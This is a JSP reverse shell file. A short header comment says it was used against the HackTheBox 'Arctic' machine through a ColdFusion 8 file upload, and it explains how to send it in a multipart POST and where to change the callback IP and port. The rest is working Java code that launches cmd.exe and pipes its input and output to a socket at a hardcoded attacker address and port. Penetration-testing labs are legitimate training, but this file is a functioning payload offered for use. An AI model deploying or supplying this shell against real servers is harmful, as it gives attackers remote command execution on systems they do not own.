<%--
I've tried a few different JSP reverse shells and they all don't seem to work.
This one is off https://blog.netspi.com/hacking-with-jsp-shells/ which seemed to work and matched a metasploit exploit JSP reverse shell used for HTB Arctic (Coldfusion 8 file upload).
You need to copy the text here into the body of an HTTP request to an HTTP server that accepts upload of JSP POST data.
You have to change the IP and port in the line that begins with 'Socket socket' near the bottom.
I believe that you can also generate the follwoing payload using using MSF Venom payload java/jsp_shell_reverse_tcp but you're format has to be 'raw' for it to work.
You may also have to have the following preceding this information (what was needed for this POST of data to work for HTB Arctic).  The "newfile" and "crew.txt" may or may not be needed...
POST .....
Header_stuff.....
Content-Length: xxxxxxx
Content-Type: multipart/form-data; boundary=shoes

--shoes
Content-Disposition: form-data; name="newfile"; filename="crew.txt"

Content-Type:application/x-java-archive
--%>
<%@page import="java.lang.*"%>

<%@page import="java.util.*"%>

<%@page import="java.io.*"%>

<%@page import="java.net.*"%>



<%

  class StreamConnector extends Thread

  {

    InputStream fe;

    OutputStream qb;



    StreamConnector( InputStream fe, OutputStream qb )

    {

      this.fe = fe;

      this.qb = qb;
                                                 
    }



    public void run()

    {

      BufferedReader za  = null;

      BufferedWriter rkq = null;

      try

      {

        za  = new BufferedReader( new InputStreamReader( this.fe ) );

        rkq = new BufferedWriter( new OutputStreamWriter( this.qb ) );

        char buffer[] = new char[8192];

        int length;

        while( ( length = za.read( buffer, 0, buffer.length ) ) > 0 )

        {

          rkq.write( buffer, 0, length );

          rkq.flush();

        }
                                                 
      } catch( Exception e ){}

      try

      {

        if( za != null )

          za.close();

        if( rkq != null )

          rkq.close();

      } catch( Exception e ){}

    }

  }



  try

  {

    String ShellPath = "cmd.exe"; 

    Socket socket = new Socket( "10.10.14.27", 4444 );

    Process process = Runtime.getRuntime().exec( ShellPath );

    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();

    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();

  } catch( Exception e ) {}

%>
